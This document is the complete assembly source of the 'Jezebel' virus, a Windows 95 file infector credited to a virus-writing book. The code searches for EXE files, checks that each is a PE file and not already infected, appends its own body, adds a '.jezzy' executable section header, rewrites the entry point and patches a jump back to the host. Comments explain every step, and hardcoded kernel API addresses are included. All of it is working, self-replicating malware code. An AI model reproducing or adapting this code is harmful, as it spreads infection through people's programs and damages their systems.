;The Jezebel virus.
;(C) 1996,8 American Eagle Publications, Inc. All Rights Reserved.
;Use of this virus is licensed, as described in "The Giant Black Book of Computer
;Viruses", published by American Eagle Publications, Inc. All copyright violations
;will be punished to the full extent of the law.
;
;This virus is named after Jezebel, the queen of Ahab, King of Israel.
;
.386
locals
jumps
.model flat,STDCALL

;*****************************************************************************
;*****************************************************************************
;The host for the virus loader starts here. This program assembles to look
;exactly what an infection would look like if it were dynamically performed.

INCLUDE HOST2.INC

;*****************************************************************************
;*****************************************************************************
; The Jezebel Virus starts here.

;Definitions for the virus
MAX_PATH        EQU     255H            ;maximum path length in Win 95/NT
OPEN_EXISTING   EQU     3               ;flag for CreateFile to open existing file
GENERIC_READ    EQU     80000000H       ;flags for CreateFile
GENERIC_WRITE   EQU     40000000H
FATTR_NORMAL    EQU     0               ;normal file attribute for CreateFile

PE_SIZE         EQU     248             ;size of PE file header
SEC_SIZE        EQU     40              ;size of a section header
FB_SIZE         EQU     1024            ;size of workspace for file reading

;Stack frame definitions:
SRCH_HANDLE     EQU     0               ;handle for file search functions
TEMP            EQU     SRCH_HANDLE+4   ;temporary storage location
FHANDLE         EQU     TEMP+4          ;handle for file open/read/write/close
IOBYTES         EQU     FHANDLE+4
FIND_DATA       EQU     IOBYTES+4       ;file search data structure
;typedef struct _WIN32_FIND_DATA {
;   DWORD dwFileAttributes;
;   FILETIME ftCreationTime;            ;DD ?,?
;   FILETIME ftLastAccessTime;          ;DD ?,?
;   FILETIME ftLastWriteTime;           ;DD ?,?
;   DWORD nFileSizeHigh;
;   DWORD nFileSizeLow;
;   DWORD dwReserved0;
;   DWORD dwReserved1;
;   CHAR cFileName[MAX_PATH];
;   CHAR cAlternateFileName[ 14 ];
;} WIN32_FIND_DATA
FILEBUF         EQU     FIND_DATA+11*4+14+MAX_PATH
WORKSP          EQU     FILEBUF+FB_SIZE

;The virus code itself starts right here. Control is passed here when the
;program starts up. This is the main control routine, which performs the
;infection and then passes control to the host

VIRUS:  call    RELOC
RELOC:  pop     edi                     ;edi contains relocation address for virus
        sub     edi,OFFSET RELOC
        push    ebp
        sub     esp,WORKSP              ;set up temporary data area on stack
        mov     ebp,esp

        call    FIND_FIRST_EXE          ;find a file
        jz      EXIT                    ;no more files to infect, exit to host
INFECT: call    INFECT_FILE             ;infect the file we've found
        call    FIND_NEXT_EXE           ;find another file
        jnz     INFECT

EXIT:   add     esp,WORKSP
        pop     ebp                     ;get rid of temporary data area
HADDR:  jmp     HOST                    ;this address is dynamically modified by the virus

;This routine infects the file found by FIND_FIRST_EXE and FIND_NEXT_EXE, if
;it can. First it must check to see if the file is infectable. To be infectable,
;the file must be a 32-bit Portable Executable, and the virus must not already
;be present.

INFECT_FILE:
        call    OPEN_FILE               ;open the EXE file specified in FIND_DATA
        jz      IFEX1                   ;successful? no, just exit
        mov     [ebp+FHANDLE],eax       ;save handle here
        call    IS_PE_FILE              ;check to see if this is a PE file (also sets ebp+esi->PE header)
        jnz     IFEX                    ;no, close file and exit
        call    CAN_INFECT              ;check to see if it can be infected
        jz      _IF1                    ;yes, go do it

IFEX:   push    DWORD PTR [ebp+FHANDLE] ;exit INFECT_FILE routine
        call    DWORD PTR [edi+CLOSE_HANDLE]  ;close the file
IFEX1:  ret                             ;and return to caller

;If we get here, we have a valid 32-bit file with a PE header, and the
;virus is not present. The infection process may begin.
_IF1:
        mov     eax,[ebp+FIND_DATA+32]  ;size of EXE file
        call    FILE_SEEK               ;seek to end of file

        mov     eax,VIR_SIZE-1          ;amount to write (VIR_SIZE plus padding)
        mov     ecx,[ebp+esi+60]        ;FileAlignment
        add     eax,ecx                 ;eax=VIR_SIZE-1+FileAlignment
        xor     edx,edx
        div     ecx                     ;eax=eax/FileAlignment
        mul     ecx                     ;eax=eax*FileAlignment (next largest multiple of FileAlignment)
        mov     ecx,eax                 ;amount to write
        push    eax                     ;save amount to write for section hdr
        lea     edx,[edi+OFFSET VIRUS]  ;buffer to write from
        call    FILE_WRITE              ;go ahead and write virus body to file

;Now the virus body has been written to the file. Let's modify the PE header
;so the virus will get control when the program starts. The first step is to
;add an extra section header.

        inc     WORD PTR [ebp+esi+6]   ;increment number of sections
        xor     eax,eax
        mov     ax,[ebp+esi+6]         ;and get new number in eax

        push    esi
        push    edi
        dec     eax
        mov     ecx,SEC_SIZE
        mul     ecx                     ;eax=eax*SEC_SIZE
        add     eax,PE_SIZE
        add     eax,esi                 ;eax=proper location in stack frame
        add     eax,ebp
        mov     esi,edi
        add     esi,OFFSET SEC_HDR      ;esi -> section hdr template
        mov     edi,eax                 ;edi -> new section hdr entry loc
        mov     ebx,eax
        rep     movsb                   ;move template into place
        pop     edi
        pop     esi                     ;restore esi and edi

        pop     eax
        mov     [ebx+16],eax            ;set SizeRawData, as calculated by above file write

        mov     eax,[ebp+FIND_DATA+32]  ;old size of EXE file
        mov     [ebx+20],eax            ;set PtrRawData = old size

        mov     eax,[ebx-40+16]         ;get SizeRawData from previous section header
        dec     eax
        mov     ecx,[ebp+esi+56]        ;get SectionAlignment
        add     eax,ecx                 ;add eax=SizeRawData-1+SectionAlignment
        xor     edx,edx
        div     ecx
        mul     ecx                     ;size of code in SectionAlignment blocks
        add     eax,[ebx-40+12]         ;add in last section's virtual address
        mov     [ebx+12],eax            ;and set VirtualAddress for this section

;That's the end of adding the new section header. Now we must modify a few
;fields in the PE header itself.

        xchg    eax,[ebp+esi+40]        ;set up new entry point
        mov     [ebp+TEMP],eax          ;save old entry point here

        mov     eax,[ebx+16]            ;get SizeOfRawData from new section hdr
        add     [ebp+esi+28],eax        ;update SizeOfCode in PE header

        mov     eax,[ebx+16]            ;get SizeRawData from viral section hdr
        dec     eax
        add     eax,ecx                 ;add eax=SizeRawData-1+SectionAlignment
        xor     edx,edx
        div     ecx
        mul     ecx                     ;size of code in SectionAlignment blocks
        add     [ebp+esi+80],eax        ;update SizeOfImage

;Now the header is completely set up and ready to go. The next step is to save
;it to disk.

        mov     eax,esi
        sub     eax,FILEBUF             ;eax = offset of PE header in file
        call    FILE_SEEK               ;seek to proper place

        xor     ecx,ecx
        mov     cx,[ebp+esi+6]          ;# of section headers to ecx
        mov     eax,SEC_SIZE            ;size of section header
        mul     ecx                     ;size of section headers
        mov     ecx,PE_SIZE             ;size of PE header
        add     ecx,eax                 ;ecx=amount to write
        lea     edx,[ebp+esi]           ;address to write from
        call    FILE_WRITE              ;update PE header

;The final step is to update the jump address so the virus can return
;to the host when it is done doing its job.

        mov     eax,[ebp+FIND_DATA+32]  ;get old file size
        add     eax,OFFSET HADDR - OFFSET VIRUS + 1
        call    FILE_SEEK               ;seek to proper location in file

        mov     eax,[ebp+esi+40]        ;get new entry point
        add     eax,OFFSET HADDR - OFFSET VIRUS + 5     ;RVA to jump from
        sub     [ebp+TEMP],eax          ;subtract from destination address

        mov     ecx,4                   ;now adjust jump address in host
        lea     edx,[ebp+TEMP]
        call    FILE_WRITE              ;write it to file
        jmp     IFEX                    ;and exit infect routine

;This seeks in the file with handle FHANDLE to the location eax from the
;beginning.
FILE_SEEK:
        push    LARGE 0                 ;FILE_BEGIN move method
        push    LARGE 0                 ;High DWORD of location is 0
        push    eax                     ;Low DWORD of location to move to
        push    DWORD PTR [ebp+FHANDLE] ;handle
        call    DWORD PTR [edi+SET_FILE_PTR]
        ret

;This routine writes ecx bytes to the file whose handle is in FHANDLE.
;The data is written from the buffer pointed to by edx.
FILE_WRITE:
        push    LARGE 0         ;overlapping data structure (irrelevant)
        lea     eax,[ebp+IOBYTES]
        push    eax             ;address of bytes read
        push    ecx             ;bytes to read
        push    edx             ;buffer to read data into
        push    DWORD PTR [ebp+FHANDLE]   ;file handle
        call    DWORD PTR [edi+OFFSET WRITE_FILE]
        or      eax,eax         ;set z if read failed
        ret

;This routine reads ecx bytes from the file whose handle is in FHANDLE.
;The data is put in the buffer pointed to by edx.
FILE_READ:
        push    LARGE 0         ;overlapping data structure (irrelevant)
        lea     eax,[ebp+IOBYTES]
        push    eax             ;address of bytes read
        push    ecx             ;bytes to read
        push    edx             ;buffer to read data into
        push    DWORD PTR [ebp+FHANDLE]   ;file handle
        call    DWORD PTR [edi+OFFSET READ_FILE]
        or      eax,eax         ;set z if read failed
        ret

;This checks the opened file with handle in FHANDLE to see if it is a PE-style
;executable or not. If not, it returns with NZ set, otherwise Z is set.
IS_PE_FILE:
        mov     ecx,FB_SIZE             ;read FB_SIZE bytes
        lea     edx,[ebp+FILEBUF]       ;into this buffer
        call    FILE_READ               ;read file header information
        jz      IPEX                    ;exit on error

        cmp     BYTE PTR [ebp+FILEBUF+18H],40H  ;valid extended header?
        jc      IPEX
        mov     ax,[ebp+FILEBUF+3CH]    ;now find the PE header
        cmp     ax,FB_SIZE              ;keep from overflowing the stack
        jge     IPEX                    ;don't infect if it will
        cwde                            ;eax = offset into header where PE header starts
        mov     esi,FILEBUF
        add     esi,eax                 ;ebp+esi points to PE header
        mov     eax,[ebp+esi]           ;eax = PE header signature
        cmp     eax,'EP'                ;proper PE header?
        jne     IPEX                    ;nope, don't attempt to infect
        ret
IPEX:   mov     al,1
        or      al,al                   ;return with with nz set
        ret

;This routine checks to see if the PE file in question can be infected. There
;are two basic tests it makes. Firstly, it checks to see if the last section
;in the file is named ".jezzy" and if so, the file is already infected.
;It also checks to see if the file has room to support an extra section header
;and whether there is room in memory for it.
CAN_INFECT:
        mov     eax,esi
        sub     eax,FILEBUF
        add     eax,PE_SIZE             ;eax = size of DOS header + PE header
        mov     ebx,eax                 ;save it here

        xor     eax,eax
        mov     ax,[ebp+esi+6]          ;get actual section count
        inc     eax                     ;                        +1
        mov     ecx,SEC_SIZE            ;determine the size of needed section headers
        mul     ecx
        add     eax,ebx                 ;eax=size of all header info needed

        cmp     eax,FB_SIZE             ;will it fit in FILEBUF?
        jnc     CINO                    ;nope, exit with NZ set - don't infect

        cmp     eax,[ebp+esi+PE_SIZE+12];will it fit in the file?
        jnc     CINO                    ;nope, exit with NZ set

        xor     eax,eax
        mov     ax,[ebp+esi+6]          ;get actual section count again
        dec     eax
        mov     ecx,SEC_SIZE
        mul     ecx
        add     eax,PE_SIZE             ;eax = distance from PE header start to last section hdr
        mov     ebx,eax
        add     ebx,esi
        cmp     [ebp+ebx],'zej.'        ;check for Jezebel
        je      CINO                    ;it's there, already infected!
CIYES:  xor     al,al                   ;clear to infect, set z and return
        ret
CINO:   mov     al,1
        or      eax,eax                 ;don't infect, return with NZ
        ret



;The following routines search for EXE files to infect. FIND_FIRST_EXE is
;called first, followed by repeated calls to FIND_NEXT_EXE until there are
;no more files to infect. These routines return with Z set when there are
;no more EXE files available.
FIND_FIRST_EXE:
        lea     eax,[ebp+FIND_DATA]     ;perform FindFirst function
        push    eax
        lea     eax,[edi+OFFSET EXE_FILE]
        push    eax
        call    DWORD PTR [edi+FIND_FIRST_FILE]
        mov     [ebp+SRCH_HANDLE],eax
        cmp     eax,-1                  ;check for invalid handle
        ret

FIND_NEXT_EXE:
        lea     eax,[ebp+FIND_DATA]     ;now perform FindNext function
        push    eax
        mov     eax,[ebp+SRCH_HANDLE]
        push    eax
        call    DWORD PTR [edi+FIND_NEXT_FILE]
        or      eax,eax
        ret

EXE_FILE        DB      '*.EXE',0

OPEN_FILE:
        xor     eax,eax                 ;we need to push a bunch of 0 dwords
        push    eax                     ;and this is most efficient here
        push    eax                     ;FATTR_NORMAL
        push    LARGE OPEN_EXISTING
        push    eax
        push    eax
        push    LARGE GENERIC_READ or GENERIC_WRITE
        lea     eax,[ebp+FIND_DATA+44]  ;file name from search structure
        push    eax
        call    DWORD PTR [edi+CREATE_FILE]
        cmp     eax,-1                  ;was file opened successfully?
        ret

CODE_SEC        EQU     00000020H       ;Flag values for section header
EXECUTABLE      EQU     20000000H
READABLE        EQU     40000000H

SEC_HDR         DB      '.jezzy',0,0    ;"jezzy" virus section header template
                DD      VIR_SIZE        ;VirtualSize
                DD      0               ;VirtualAddress
                DD      0               ;SizeRawData
                DD      0               ;PtrRawData
                DD      0               ;PtrRelocs
                DD      0               ;PtrLineNos
                DW      0               ;NumRelocs
                DW      0               ;NumLineNos
                DD      CODE_SEC or EXECUTABLE or READABLE  ;Flags

;The folowing defines locate the API calls which the virus uses in 32-bit
;memory. The assigned values are the actual addresses of these routines in
;memory in the first general release of Windows 95. They are determined
;experimentally with a debugger, single stepping through ordinary calls.
;THE FOLLOWING VALUES ARE VALID FOR WINDOWS 95 VERSION 4.00.950
;FIND_FIRST      EQU     0BFF77893H      ;@FindFirstFileA
;FIND_NEXT       EQU     0BFF778CBH      ;@FindNextFileA
;CREATE          EQU     0BFF77817H      ;@CreateFileA
;CLOSE_FILE      EQU     0BFF7BC72H      ;@CloseHandle
;SET_FP          EQU     0BFF76FA0H      ;@SetFilePointer
;READFILE        EQU     0BFF75806H      ;@ReadFile
;WRITEFILE       EQU     0BFF7580DH      ;@WriteFile

;THE FOLLOWING VALUES ARE VALID FOR WINDOWS 95 VERSION 4.00.1111
;(Uncomment them to use)
FIND_FIRST      EQU     0BFF77A18H      ;@FindFirstFileA
FIND_NEXT       EQU     0BFF77A50H      ;@FindNextFileA
CREATE          EQU     0BFF7799CH      ;@CreateFileA
CLOSE_FILE      EQU     0BFF7BC8BH      ;@CloseHandle
SET_FP          EQU     0BFF770E4H      ;@SetFilePointer
READFILE        EQU     0BFF7594AH      ;@ReadFile
WRITEFILE       EQU     0BFF75951H      ;@WriteFile


;The following are a jump table for the virus to call the Win 95 Kernel.
FIND_FIRST_FILE DD      FIND_FIRST
FIND_NEXT_FILE  DD      FIND_NEXT
CREATE_FILE     DD      CREATE
CLOSE_HANDLE    DD      CLOSE_FILE
SET_FILE_PTR    DD      SET_FP
READ_FILE       DD      READFILE
WRITE_FILE      DD      WRITEFILE

                DB      'The Jezebel Virus'


VIR_SIZE        EQU     $ - OFFSET VIRUS

        ends

        end     VIRUS
